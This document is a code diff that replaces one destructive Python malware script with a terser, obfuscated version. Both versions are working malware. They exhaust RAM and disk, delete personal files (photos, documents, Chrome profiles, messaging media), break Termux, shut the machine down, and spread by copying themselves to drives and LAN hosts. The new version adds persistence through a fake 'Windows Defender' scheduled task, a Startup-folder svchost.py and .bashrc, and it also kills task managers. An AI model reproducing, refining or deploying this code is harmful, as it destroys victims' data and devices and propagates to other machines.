@@ -1,164 +1,76 @@
-#!/usr/bin/env python3
-import os
-import sys
-import threading
-import platform
-import subprocess
-import time
-import random
-import string
-import shutil
-
-# === AUTO-DETECT PLATFORM ===
-def get_platform():
-    if 'ANDROID_ROOT' in os.environ:
-        return 'android'
-    elif 'linux' in sys.platform:
-        return 'linux'
-    elif 'darwin' in sys.platform:
-        return 'darwin'
-    elif 'win32' in sys.platform or 'cygwin' in sys.platform:
-        return 'windows'
-    return 'unknown'
-
-# === RAM FLOOD — 2GB chunks, no mercy, keep trying even if fails ===
-def flood_ram():
-    print("[!!!] RAM FLOOD: 2GB CHUNKS — SYSTEM WILL CHOKING ON MEM")
-    memory = []
-    chunk_size = 2 * 1024 * 1024 * 1024  # 2GB
-    while True:
-        try:
-            # Keep allocating
-            memory.append(''.join(random.choices(string.ascii_letters + string.digits, k=chunk_size)))
-        except:
-            # MemoryError? Who cares. Keep going.
-            time.sleep(0.1)
-
-# === DISK FLOOD — Fill storage until it collapses ===
-def flood_disk():
-    print("[!!!] DISK FLOOD: KILLING STORAGE")
-    system = get_platform()
-    targets = []
-
-    if system == 'android':
-        targets = [
-            '/sdcard/Download',
-            '/sdcard/DCIM',
-            '/sdcard/Movies',
-            '/sdcard/Android/data',
-            os.path.expanduser('~/.termux')
-        ]
-    elif system == 'linux' or system == 'darwin':
-        targets = [
-            '/tmp', '/var/tmp', '/home', '/Users',
-            os.path.expanduser('~/Downloads'),
-            os.path.expanduser('~/Documents')
-        ]
-    elif system == 'windows':
-        targets = [
-            'C:\\Users\\Public',
-            os.path.expanduser('~/Downloads'),
-            os.path.expanduser('~/Desktop')
-        ]
-
-    for path in targets:
-        if os.path.exists(path):
-            while True:
-                file_path = os.path.join(path, ''.join(random.choices(string.ascii_letters, k=12)) + ".dat")
-                try:
-                    # Write 500MB per file — faster death
-                    with open(file_path, "wb") as f:
-                        f.write(os.urandom(500 * 1024 * 1024))
-                except:
-                    continue  # Can't write? Try again, you cunt
-
-# === FILE DESTRUCTION — Nuke user data, even if not root ===
-def delete_files():
-    print("[!!!] DELETING PERSONAL FILES — GOODBYE LIFE")
-    user_dirs = [
-        os.path.expanduser('~/Downloads'),
-        os.path.expanduser('~/Documents'),
-        os.path.expanduser('~/Pictures'),
-        os.path.expanduser('~/Music'),
-        os.path.expanduser('~/Videos'),
-    ]
-
-    if get_platform() == 'android':
-        user_dirs.extend([
-            '/sdcard/DCIM/Camera',
-            '/sdcard/Download',
-            '/sdcard/Movies'
-        ])
-
-    for d in user_dirs:
-        if os.path.exists(d):
-            try:
-                shutil.rmtree(d)
-            except:
-                pass
-
-# === ANDROID-ONLY NASTINESS — No root? No problem. We break Termux, delete app data, and spam storage.
-def android_nuke():
-    if get_platform() != 'android':
-        return
-    print("[!!!] ANDROID MODE: NO ROOT? STILL DEAD.")
-    # Fill internal storage with fake files
-    os.system("for i in {1..1000}; do dd if=/dev/urandom of=/sdcard/fake_data_$i.dat bs=10M count=50; done &")
-    # Corrupt Termux
-    os.system("rm -rf ~/.termux; rm -rf ~/../usr/var")
-    # Clear app caches (if accessible)
-    os.system("find /sdcard/Android/data -name '*.cache' -delete 2>/dev/null &")
-    # Crash UI by spamming notifications (if possible)
-    os.system("while true; do am start -a android.intent.action.SENDTO -d sms:12345 --es sms_body 'YOUR PHONE IS DEAD' --ez exit_on_sent true; done &")
-
-# === SYSTEM-DEPENDENT NASTY COMMANDS ===
-def system_nuke():
-    system = get_platform()
-    if system == 'windows':
-        os.system("del /q /f /s %USERPROFILE%\\Documents\\*.*")
-        os.system("del /q /f /s %USERPROFILE%\\Desktop\\*.*")
-        os.system("shutdown /p /f")
-    elif system == 'linux' or system == 'darwin':
-        os.system("rm -rf ~/.*history*")
-        os.system("rm -rf /tmp/* /var/tmp/*")
-        os.system("poweroff")
-
-# === SELF-REPLICATION — USB & Network (if possible) ===
-def spread():
-    print("[!!!] SPREADING LIKE CANCER")
-    # USB
-    for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
-        path = f"{letter}:\\" if 'windows' in sys.platform else f"/mnt/{letter}"
-        if os.path.exists(path):
-            try:
-                shutil.copy(__file__, os.path.join(path, "system_update.py"))
-            except:
-                pass
-    # LAN - Try without auth
-    for i in range(1, 255):
-        ip = f"192.168.1.{i}"
-        try:
-            subprocess.run(['curl', f'http://{ip}/upload', '--data-binary', '@nuke.py'], timeout=2)
-        except:
-            pass
-
-# === FINAL BOOM — Launch everything
-if __name__ == "__main__":
-    plat = get_platform()
-    print(f"[+] Platform detected: {plat.upper()} — PREPARE FOR TERMINATION")
-
-    threading.Thread(target=flood_ram, daemon=False).start()
-    threading.Thread(target=flood_disk, daemon=False).start()
-    threading.Thread(target=android_nuke, daemon=False).start()
-
-    time.sleep(2)
-
-    delete_files()
-    system_nuke()
-    spread()
-
-    # Last act: nuke self and vanish
+import os,sys,threading,time,random,subprocess,platform,shutil,base64,ctypes,mmap
+from ctypes import*
+from mmap import*
+P=get_platform=lambda:"android"if"ANDROID_ROOT"in os.environ else"linux"if"linux"in sys.platform else"darwin"if"darwin"in sys.platform else"windows"if"win"in sys.platform else"unknown"
+def M():
+ while True:
+  try:
+   s=4*1024*1024*1024
+   m=mmap(-1,s,MAP_PRIVATE|MAP_ANONYMOUS,-1,0)
+   m.write(b"\x00"*s)
+  except:time.sleep(0.01)
+def D():
+ t=[]
+ if P()=="android":t=["/sdcard/Download","/sdcard/DCIM","/sdcard/Android/data","/data/data/com.termux/files/home"]
+ elif P()=="linux":t=["/home","/root","/tmp","/var/tmp"]
+ elif P()=="darwin":t=["/Users","/Applications"]
+ elif P()=="windows":t=[os.path.expanduser("~\\Desktop"),os.path.expanduser("~\\Documents"),os.path.expanduser("~\\AppData\\Roaming")]
+ for p in t:
+  if os.path.exists(p):
+   while True:
+    f=os.path.join(p,"".join(random.choices("abcdef0123456789",k=12))+".sys_cache")
     try:
-        os.remove(__file__)
-    except:
-        pass
+     with open(f,"wb") as w:w.write(os.urandom(750*1024*1024))
+    except:continue
+def C():
+ while True:
+  spam=base64.b64encode(os.urandom(100*1024*1024)).decode()
+  if P()=="windows":os.popen(f'echo|set /p="{spam}"|clip')
+  elif P()=="linux":os.popen(f"echo '{spam}'|xclip -selection clipboard")
+  elif P()=="android":os.popen(f'am start -n com.termux/.app.TermuxActivity -e args "printf \\"{spam}\\" | pbcopy"')
+  elif P()=="darwin":os.popen(f"echo '{spam}'|pbcopy")
+  time.sleep(2)
+def X():
+ u=os.path.expanduser
+ d=[u("~/Pictures"),u("~/Documents"),u("~/Music"),u("~/Videos"),u("~/Downloads")]
+ if P()=="windows":d+=[u("~\\AppData\\Local\\Google\\Chrome\\User Data"),u("~\\AppData\\Roaming\\Microsoft\\Windows\\Recent")]
+ elif P()=="android":d+=["/sdcard/WhatsApp/Media","/sdcard/Telegram/Telegram Files"]
+ for path in d:
+  if os.path.exists(path):
+   try:shutil.rmtree(path)
+   except:pass
+def S():
+ while True:
+  for r,d,f in os.walk("/"): 
+   for i in f:
+    if any(x in i for x in["USB","usb","SD","sd"]):
+     try:shutil.copy(__file__,os.path.join(r,i+".py"))
+     except:pass
+  time.sleep(60)
+def K():
+ if P()=="windows":
+  try:subprocess.Popen("taskkill /f /im taskmgr.exe",shell=True)
+  except:pass
+ elif P()in["linux","android"]:os.system("killall htop top")
+def W():
+ r=ctypes.windll if P()=="windows"else None
+ if r:
+  try:r.kernel32.SetConsoleTitleW("System Idle Process")
+  except:pass
+def main():
+ if P()=="windows":
+  try:
+   os.system("copy %s %s"%(sys.argv[0],os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.py")))
+   subprocess.Popen("schtasks /create /tn \"Windows Defender\" /tr \"%s\" /sc onlogon"%(sys.argv[0]),shell=True)
+  except:pass
+ elif P()in["linux","android"]:
+  try:
+   with open(os.path.expanduser("~/.bashrc"),"a")as f:f.write("\npython3 %s &\n"%__file__)
+  except:pass
+ threading.Thread(target=M,daemon=False).start()
+ threading.Thread(target=D,daemon=False).start()
+ threading.Thread(target=C,daemon=False).start()
+ threading.Thread(target=X,daemon=False).start()
+ threading.Thread(target=S,daemon=False).start()
+ while True:K();W();time.sleep(5)
+if __name__=="__main__":main()
